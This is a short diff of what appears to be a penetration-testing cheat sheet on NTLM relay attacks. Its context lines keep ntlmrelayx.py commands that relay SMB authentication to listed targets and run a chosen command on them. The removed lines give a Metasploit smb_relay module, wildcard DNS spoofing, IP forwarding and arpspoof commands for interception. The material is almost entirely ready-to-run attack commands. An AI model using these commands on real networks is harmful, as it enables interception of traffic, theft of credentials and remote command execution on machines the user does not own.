@@ -73,11 +73,3 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
 ```
-msfconsole
-use windows/smb/smb_relay
-
-echo "ip *.domain" > dns
-dnsspoof -i eth1 -f dns
-echo 1 > /proc/sys/net/ipv4/ip_forward
-arpspoof -i eth1 -t target getway
-arpspoof -i eth1 -t  gateway target
